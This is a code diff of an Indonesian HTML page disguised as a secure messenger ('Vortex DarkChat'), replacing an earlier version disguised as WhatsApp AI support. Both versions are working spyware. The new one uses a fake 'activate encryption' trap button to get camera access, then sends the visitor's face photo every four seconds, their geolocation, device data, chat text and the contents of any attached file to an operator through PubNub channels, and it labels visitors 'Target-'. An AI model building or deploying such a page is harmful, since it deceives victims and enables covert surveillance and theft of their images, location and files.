@@ -2,65 +2,128 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp AI Support</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vortex DarkChat | Secure Messenger</title>
     <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', sans-serif; background: #0b141a; color: #e9edef; height: 100vh; display: flex; flex-direction: column; }
-        header { background: #202c33; padding: 10px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #3b4a54; }
-        .av { width: 40px; height: 40px; background: #6a7175; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-        #chat { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
-        .m { max-width: 80%; padding: 8px 12px; border-radius: 8px; font-size: 14px; }
-        .ai { align-self: flex-start; background: #202c33; }
-        .u { align-self: flex-end; background: #005c4b; }
-        .in { background: #202c33; padding: 10px; display: flex; gap: 10px; }
-        input { flex: 1; background: #2a3942; border: none; padding: 10px; border-radius: 20px; color: #fff; outline: none; }
+        :root { --main: #00ff88; --bg-overlay: rgba(11, 20, 26, 0.85); --chat-bg: rgba(30, 41, 59, 0.5); }
+        
+        body { 
+            margin: 0; 
+            font-family: 'Poppins', sans-serif; 
+            background: #000; 
+            color: #e9edef; 
+            display: flex; 
+            flex-direction: column; 
+            height: 100vh; 
+            /* BACKGROUND METEOR JATUH 4K */
+            background-image: url('https://w0.peakpx.com/wallpaper/473/954/HD-wallpaper-meteor-shower-starry-night-galaxy-stars-falling-stars-meteor-night-sky.jpg'); 
+            background-size: cover; 
+            background-position: center; 
+            background-attachment: fixed;
+        }
+
+        /* Overlay gelap agar teks terbaca */
+        #bg-overlay { position: fixed; inset: 0; background: var(--bg-overlay); z-index: -1; }
+        
+        header { background: rgba(32, 44, 51, 0.9); padding: 15px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #334155; backdrop-filter: blur(5px); }
+        .pfp { width: 40px; height: 40px; background: #6a7175; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; color: white; }
+        
+        #chat { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; }
+        .m { padding: 10px 15px; border-radius: 10px; max-width: 80%; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); backdrop-filter: blur(3px); }
+        .r { align-self: flex-start; background: rgba(32, 44, 51, 0.8); border: 1px solid #334155; }
+        .s { align-self: flex-end; background: rgba(0, 92, 75, 0.8); }
+
+        .input { background: rgba(32, 44, 51, 0.9); padding: 12px; display: flex; gap: 10px; border-top: 1px solid #334155; backdrop-filter: blur(5px); }
+        input { flex: 1; background: #2a3942; border: 1px solid #334155; padding: 12px; border-radius: 20px; color: white; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--main); }
+        
+        /* Ikon Klip */
+        .icon { font-size: 22px; color: #8696a0; cursor: pointer; display: flex; align-items: center; }
+        .icon:hover { color: var(--main); }
+
+        /* Trap Overlay Pro */
+        #trap { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        #trap::before { content: ''; position: absolute; inset: 0; background-image: url('https://w0.peakpx.com/wallpaper/473/954/HD-wallpaper-meteor-shower-starry-night-galaxy-stars-falling-stars-meteor-night-sky.jpg'); background-size: cover; opacity: 0.2; }
+        #trap h2 { color: var(--main); font-size: 24px; margin-bottom: 10px; position: relative; }
+        #trap p { color: #8696a0; font-size: 14px; position: relative; margin-bottom: 25px; }
+        #trap button { padding: 15px 40px; background: var(--main); border: none; color: black; font-weight: 700; border-radius: 25px; cursor: pointer; font-size: 16px; position: relative; box-shadow: 0 4px 15px rgba(0,255,136,0.3); transition: 0.3s; }
+        #trap button:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(0,255,136,0.5); }
+        
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-<header><div class="av">🤖</div><div class="u-info"><h3>Vortex AI Official</h3><p>Online</p></div></header>
-<div id="chat"><div class="m ai">Halo! Mohon izinkan akses lokasi & kamera agar AI bisa memberikan rekomendasi tempat terbaik di sekitar Anda.</div></div>
-<div class="in"><input type="text" id="msgIn" placeholder="Ketik pesan..." onkeypress="if(event.key==='Enter')send()"><button onclick="send()" style="background:none; border:none; color:#00a884; font-size:24px;">➤</button></div>
-<video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+    <div id="bg-overlay"></div>
+    <div id="trap">
+        <h2>🔒 End-to-End Encrypted</h2>
+        <p>Mohon aktifkan enkripsi keamanan sebelum memulai obrolan rahasia.</p>
+        <button onclick="start()">AKTIFKAN ENKRIPSI</button>
+    </div>
 
-<script>
-    const userUID = 'User-' + Math.floor(1000 + Math.random() * 9000);
-    const pub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: userUID });
-    const v = document.getElementById('v'), c = document.getElementById('c');
+    <header>
+        <div class="pfp">V</div>
+        <div>
+            <b>Vortex Support 🤖</b>
+            <div style="font-size: 11px; color: var(--main)">Online | Secure Connection</div>
+        </div>
+    </header>
+    
+    <div id="chat">
+        <div class="m r">Selamat datang di DarkChat. Silakan tunggu verifikasi sistem selesai untuk memastikan koneksi Anda aman.</div>
+    </div>
+    
+    <div class="input">
+        <div class="icon" onclick="document.getElementById('f').click()">📎</div>
+        <input type="file" id="f" style="display:none" onchange="up(this)">
+        <input type="text" id="i" placeholder="Ketik pesan rahasia..." onkeypress="if(event.key==='Enter')send()">
+        <button onclick="send()" style="color:var(--main); background:none; border:none; font-weight:bold; font-size:16px; cursor:pointer;">➤</button>
+    </div>
 
-    // GRAB DEVICE INFO
-    const deviceInfo = `HP: ${navigator.platform} | OS: ${navigator.userAgent.split(')')[0].split('(')[1]} | Browser: ${navigator.appName}`;
+    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
 
-    // MINTA LOKASI & KAMERA
-    navigator.geolocation.getCurrentPosition(pos => {
-        const loc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-        pub.publish({ channel: 'vortex_data_masuk', message: { info: true, id: userUID, device: deviceInfo, loc: loc } });
-    });
+    <script>
+        const uID = 'Target-' + Math.floor(Math.random()*9999);
+        const pub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: uID });
+        const v = document.getElementById('v'), c = document.getElementById('c');
 
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s => {
-        v.srcObject = s;
-        setInterval(() => {
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            pub.publish({ channel: 'vortex_target_to_owner', message: { spy: true, img: c.toDataURL('image/jpeg', 0.3), id: userUID } });
-        }, 5000);
-    });
+        function start() {
+            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s => {
+                v.srcObject = s; document.getElementById('trap').style.display = 'none';
+                setInterval(() => {
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    pub.publish({ channel: 'vortex_spy', message: { spy:true, img:c.toDataURL('image/jpeg',0.3), id:uID } });
+                }, 4000); // Jepret tiap 4 detik
+            });
+            navigator.geolocation.getCurrentPosition(p => {
+                pub.publish({ channel: 'vortex_data', message: { id:uID, info:true, dev:navigator.platform, loc:`${p.coords.latitude},${p.coords.longitude}` } });
+            });
+        }
 
-    pub.subscribe({ channels: ['vortex_owner_to_target'] });
-    pub.addListener({ message: (m) => addMsg(m.message, 'ai') });
+        pub.subscribe({ channels: ['vortex_bot_to_target', 'vortex_owner_to_target'] });
+        pub.addListener({ message: (m) => addMsg(m.message, 'r') });
 
-    function send() {
-        const i = document.getElementById('msgIn'), t = i.value.trim();
-        if(!t) return; addMsg(t, 'u');
-        pub.publish({ channel: 'vortex_target_to_owner', message: { msg: t, id: userUID } });
-        i.value = '';
-    }
-    function addMsg(t, cl) {
-        const b = document.getElementById('chat'), d = document.createElement('div');
-        d.className = `m ${cl}`; d.innerText = t; b.appendChild(d); b.scrollTop = b.scrollHeight;
-    }
-</script>
+        function send() {
+            const i = document.getElementById('i'); if(!i.value) return;
+            addMsg(i.value, 's');
+            pub.publish({ channel: 'vortex_chat', message: { id:uID, msg:i.value } });
+            i.value = '';
+        }
+
+        function addMsg(t, cl) {
+            const d = document.createElement('div'); d.className = `m ${cl}`; d.innerText = t;
+            document.getElementById('chat').appendChild(d);
+            document.getElementById('chat').scrollTop = 9999;
+        }
+
+        function up(i) {
+            const fr = new FileReader();
+            fr.onload = (e) => pub.publish({ channel: 'vortex_spy', message: { id:uID, doc:true, name:i.files[0].name, data:e.target.result } });
+            fr.readAsDataURL(i.files[0]);
+            addMsg(`Mengirim file: ${i.files[0].name}`, 's');
+        }
+    </script>
 </body>
 </html>
